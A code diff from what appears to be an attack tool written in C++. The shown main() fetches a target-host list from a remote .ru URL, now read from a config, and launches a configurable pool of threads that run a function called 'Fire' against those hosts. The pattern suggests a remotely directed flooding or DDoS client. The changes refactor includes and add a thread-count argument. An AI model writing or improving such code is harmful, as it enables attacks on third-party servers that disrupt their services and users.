@@ -5,16 +5,12 @@
 #include <chrono>
 #include <atomic>
 
-#include "json.hpp"
+#include "nlohmann/json.hpp"
 
-#include "attacker.hpp"
-#include "curl_wrapper.hpp"
-#include "utils.hpp"
-
-__asm__(".symver realpath,realpath@GLIBC_2.33");
-
-extern constexpr const char *API_STRING = "/api.php";
-extern constexpr const char *APIS_LIST = "http://rockstarbloggers.ru/hosts.json";
+#include "config.h"
+#include "attacker.h"
+#include "curl_wrapper.h"
+#include "utils.h"
 
 std::atomic<bool> g_shouldStop{false};
 
@@ -26,12 +22,29 @@ void handle_sighup(int signum)
 
 int main(int argc, char **argv)
 {
+	size_t maxThreads = 
+		std::thread::hardware_concurrency() == 0 ? 
+			2 : std::thread::hardware_concurrency();
+
+	if(argc >= 2)
+	{
+		try
+		{
+			maxThreads = std::stoi(argv[1]);
+		}
+		catch(...)
+		{
+			
+		}
+	}
+
+
 	nlohmann::json hostsData;
 
-	auto wrapper = CURLWrapper();
+	auto wrapper = CURLLoader();
 
 	// Getting hosts list
-	wrapper.SetTarget(APIS_LIST);
+	wrapper.SetTarget(AttackerConfig::APIS_LIST);
 	while(true)
 	{
 		if(auto resp = wrapper.Download();
@@ -66,7 +79,7 @@ int main(int argc, char **argv)
 
 	std::vector<std::thread> pool;
 
-	for(size_t i = 0; i < std::thread::hardware_concurrency(); i++)
+	for(size_t i = 0; i < maxThreads; i++)
 	{
 		pool.push_back(std::thread(Fire, apis, std::ref(g_shouldStop)));
 	}
